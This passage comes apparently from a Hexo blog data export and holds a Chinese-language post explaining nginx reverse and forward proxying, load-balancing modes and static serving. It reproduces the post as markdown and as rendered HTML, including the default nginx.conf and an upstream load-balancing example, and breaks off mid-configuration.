</strong>代理的存在的，反向代理对外都是透明的，访问者者并不知道自己访问的是一个代理。因为客户端不需要任何配置就可以访问。<br>\n反向，实际是代理服务器来接受请求，然后将请求转发给内部网络上的服务器(转发时可以实现负载均衡)，并将从服务器上得到的结果返回客户端，此时代理服务器对外就表现为一个服务器。\n\n##### 其它\nngginx可以热部署<br>\nnginx -s reload<br>\nnginx.exe -s reload\n\n#### nginx.conf默认配置\n```\n#定义Nginx运行的用户和用户组\n#user  nobody;\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes  1;\n\n#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#进程文件\n#pid        logs/nginx.pid;\n\n\n#工作模式与连接数上限\nevents {\n   #单个进程最大连接数（最大连接数=连接数*进程数）\n    worker_connections  1024;\n}\n\n#设定http服务器\nhttp {\n   #文件扩展名与文件类型映射表\n    include       mime.types;\n    #默认文件类型\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，\n    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。\n    # 注意：如果图片显示不正常把这个改 成off。\n    sendfile        on;\n    #防止网络阻塞\n    #tcp_nopush     on;\n\n    #长连接超时时间，单位是秒\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #开启gzip压缩输出\n    #gzip  on;\n\n    #虚拟主机的配置\n    server {\n        #监听端口\n        listen       80;\n        #域名可以有多个，用空格隔开\n        server_name  localhost;\n\n        #默认编码\n        #charset koi8-r;\n\n        #定义本虚拟主机的访问日志\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n\n#### nginx.conf配置\n```\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    #在http{}内配置\n    #自己进行负载均衡配置，weight为权重\n    upstream sms{\n        server ip:port weight=1;\n        server ip:port weight=1;\n        #保证收发都是同一个连接\n        ip_hash;\n    }\n\n    upstream xxx{\n        ......\n    }\n\n    server {\n        listen       80;\n        server_name  localhost;\n\n        #charset koi8-r;\n\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #配置自己的转发,在server{}内配置\n          #过来的url\n          location /smsCollection/ {\n              #转发的url\n              proxy_pass http://sms;\n              proxy_set_header    REMOTE-HOST $remote_addr;\n              proxy_set_header   Host $host:8080;\n              proxy_set_header   X-Real-IP $remote_addr;\n              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n              proxy_read_timeout 300s;\n          }\n\n          location /SmsUpstream-1.0/sms191 {\n              .....\n          }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n","source":"_posts/tools/nginx/nginx.md","raw":"---\ntitle: nginx 基本信息\ndate: 2018-09-17 11:45:32\ntags: [tools]\n---\n\n#### 1.nginx大概作用\n\n原文链接: https://juejin.im/entry/58afa0975c497d006778502b<br/>\n###### 1.反向代理\n反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br>\n\n###### 2.负载均衡\n\nRR（默认）<br>\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br>\n\n权重<br>\n指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br>\n\nip_hash<br>\n上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br>\n\n###### 3.http服务器\nNginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br>\n动静分离<br>\n动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br>\n###### 4.正向代理\n正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br>\n\n问题： 正向反向的区别是部署在客户端还是服务端？？？？<br>\n\n2019/7/18添加: <br>\n现在，我理解的正向代理与反向代理的区别是:正向代理是将请求代理出去，反代理是将请求代理进来<br>\n\n- 正向\n\n通常用来访问无法访问的资源,如google。<br>\n例如 vpn 。client 访问代理(vpn),代理去 <strong> 帮你访问 </strong>client想要的资源，然后返回回来. 其中，有个特点，正向代理需要提前设置一些东西，例如vpn的配置信息.\n\n- 反向\n\n通常用来负载均衡，和保证内网安全.<br>\n客户端是 <strong>无感知 </strong>代理的存在的，反向代理对外都是透明的，访问者者并不知道自己访问的是一个代理。因为客户端不需要任何配置就可以访问。<br>\n反向，实际是代理服务器来接受请求，然后将请求转发给内部网络上的服务器(转发时可以实现负载均衡)，并将从服务器上得到的结果返回客户端，此时代理服务器对外就表现为一个服务器。\n\n##### 其它\nngginx可以热部署<br>\nnginx -s reload<br>\nnginx.exe -s reload\n\n#### nginx.conf默认配置\n```\n#定义Nginx运行的用户和用户组\n#user  nobody;\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes  1;\n\n#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#进程文件\n#pid        logs/nginx.pid;\n\n\n#工作模式与连接数上限\nevents {\n   #单个进程最大连接数（最大连接数=连接数*进程数）\n    worker_connections  1024;\n}\n\n#设定http服务器\nhttp {\n   #文件扩展名与文件类型映射表\n    include       mime.types;\n    #默认文件类型\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，\n    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。\n    # 注意：如果图片显示不正常把这个改 成off。\n    sendfile        on;\n    #防止网络阻塞\n    #tcp_nopush     on;\n\n    #长连接超时时间，单位是秒\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #开启gzip压缩输出\n    #gzip  on;\n\n    #虚拟主机的配置\n    server {\n        #监听端口\n        listen       80;\n        #域名可以有多个，用空格隔开\n        server_name  localhost;\n\n        #默认编码\n        #charset koi8-r;\n\n        #定义本虚拟主机的访问日志\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n\n#### nginx.conf配置\n```\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    #在http{}内配置\n    #自己进行负载均衡配置，weight为权重\n    upstream sms{\n        server ip:port weight=1;\n        server ip:port weight=1;\n        #保证收发都是同一个连接\n        ip_hash;\n    }\n\n    upstream xxx{\n        ......\n    }\n\n    server {\n        listen       80;\n        server_name  localhost;\n\n        #charset koi8-r;\n\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #配置自己的转发,在server{}内配置\n          #过来的url\n          location /smsCollection/ {\n              #转发的url\n              proxy_pass http://sms;\n              proxy_set_header    REMOTE-HOST $remote_addr;\n              proxy_set_header   Host $host:8080;\n              proxy_set_header   X-Real-IP $remote_addr;\n              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n              proxy_read_timeout 300s;\n          }\n\n          location /SmsUpstream-1.0/sms191 {\n              .....\n          }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n","slug":"tools/nginx/nginx","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m3005j6dcp33xh8c1n","content":"<h4 id=\"1-nginx大概作用\"><a href=\"#1-nginx大概作用\" class=\"headerlink\" title=\"1.nginx大概作用\"></a>1.nginx大概作用</h4><p>原文链接: <a href=\"https://juejin.im/entry/58afa0975c497d006778502b\" target=\"_blank\" rel=\"noopener\">https://juejin.im/entry/58afa0975c497d006778502b</a><br></p>\n<h6 id=\"1-反向代理\"><a href=\"#1-反向代理\" class=\"headerlink\" title=\"1.反向代理\"></a>1.反向代理</h6><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br></p>\n<h6 id=\"2-负载均衡\"><a href=\"#2-负载均衡\" class=\"headerlink\" title=\"2.负载均衡\"></a>2.负载均衡</h6><p>RR（默认）<br><br>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br></p>\n<p>权重<br><br>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br></p>\n<p>ip_hash<br><br>上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br></p>\n<h6 id=\"3-http服务器\"><a href=\"#3-http服务器\" class=\"headerlink\" title=\"3.http服务器\"></a>3.http服务器</h6><p>Nginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br><br>动静分离<br><br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br></p>\n<h6 id=\"4-正向代理\"><a href=\"#4-正向代理\" class=\"headerlink\" title=\"4.正向代理\"></a>4.正向代理</h6><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br></p>\n<p>问题： 正向反向的区别是部署在客户端还是服务端？？？？<br></p>\n<p>2019/7/18添加: <br><br>现在，我理解的正向代理与反向代理的区别是:正向代理是将请求代理出去，反代理是将请求代理进来<br></p>\n<ul>\n<li>正向</li>\n</ul>\n<p>通常用来访问无法访问的资源,如google。<br><br>例如 vpn 。client 访问代理(vpn),代理去 <strong> 帮你访问 </strong>client想要的资源，然后返回回来. 其中，有个特点，正向代理需要提前设置一些东西，例如vpn的配置信息.</p>\n<ul>\n<li>反向</li>\n</ul>\n<p>通常用来负载均衡，和保证内网安全.<br><br>客户端是 <strong>无感知 </strong>代理的存在的，反向代理对外都是透明的，访问者者并不知道自己访问的是一个代理。因为客户端不需要任何配置就可以访问。<br><br>反向，实际是代理服务器来接受请求，然后将请求转发给内部网络上的服务器(转发时可以实现负载均衡)，并将从服务器上得到的结果返回客户端，此时代理服务器对外就表现为一个服务器。</p>\n<h5 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h5><p>ngginx可以热部署<br><br>nginx -s reload<br><br>nginx.exe -s reload</p>\n<h4 id=\"nginx-conf默认配置\"><a href=\"#nginx-conf默认配置\" class=\"headerlink\" title=\"nginx.conf默认配置\"></a>nginx.conf默认配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">#user  nobody;</span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程文件</span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">   #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#设定http服务器</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">   #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，</span><br><span class=\"line\">    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。</span><br><span class=\"line\">    # 注意：如果图片显示不正常把这个改 成off。</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #防止网络阻塞</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启gzip压缩输出</span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #默认编码</span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    